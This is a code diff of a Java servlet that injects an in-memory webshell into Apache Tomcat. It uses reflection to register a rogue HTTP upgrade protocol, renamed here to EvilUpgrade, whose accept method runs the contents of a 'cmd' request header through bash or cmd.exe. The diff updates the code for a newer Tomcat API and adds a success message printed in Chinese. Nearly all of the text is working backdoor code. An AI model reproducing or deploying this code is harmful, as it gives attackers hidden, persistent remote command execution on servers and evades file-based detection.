@@ -19,7 +19,6 @@ import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
 import org.apache.tomcat.util.net.SocketWrapperBase;
 
 import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.nio.ByteBuffer;
 import java.io.IOException;
 import java.util.HashMap;
@@ -31,7 +30,7 @@ public class InjectUpgrade extends HttpServlet {
         doPost(req, resp);
     }
 
-    class MyUpgrade implements UpgradeProtocol {
+    class EvilUpgrade implements UpgradeProtocol {
         @Override
         public String getHttpUpgradeName(boolean b) {
             return null;
@@ -53,13 +52,16 @@ public class InjectUpgrade extends HttpServlet {
         }
 
         @Override
-        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, org.apache.coyote.Request request) {
+        public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase<?> socketWrapperBase, Adapter adapter, org.apache.coyote.Request request) {
             return null;
         }
+
+
 
         @Override
         public boolean accept(org.apache.coyote.Request request) {
             String p = request.getHeader("cmd");
+            System.out.println(p);
             try {
                 String[] cmd = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", p} : new String[]{"/bin/bash", "-c", p};
                 Field response = org.apache.coyote.Request.class.getDeclaredField("response");
@@ -92,15 +94,14 @@ public class InjectUpgrade extends HttpServlet {
             Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
             upgradeProtocolsField.setAccessible(true);
             upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
-            byte[] bytes = "sss".getBytes();
-            MyUpgrade myUpgrade = new MyUpgrade();
-            upgradeProtocols.put("hello", myUpgrade);
+
+            EvilUpgrade evilUpgrade = new EvilUpgrade();
+            upgradeProtocols.put("hello", evilUpgrade);
 
             upgradeProtocolsField.set(handler, upgradeProtocols);
 
-//            Method method = MyUpgrade.class.getDeclaredMethod("accept", org.apache.coyote.Request.class);
-//            method.setAccessible(true);
-//            method.
+            System.out.println("注入Upgrade成功");
+
         } catch (Exception e) {
             e.printStackTrace();
         }
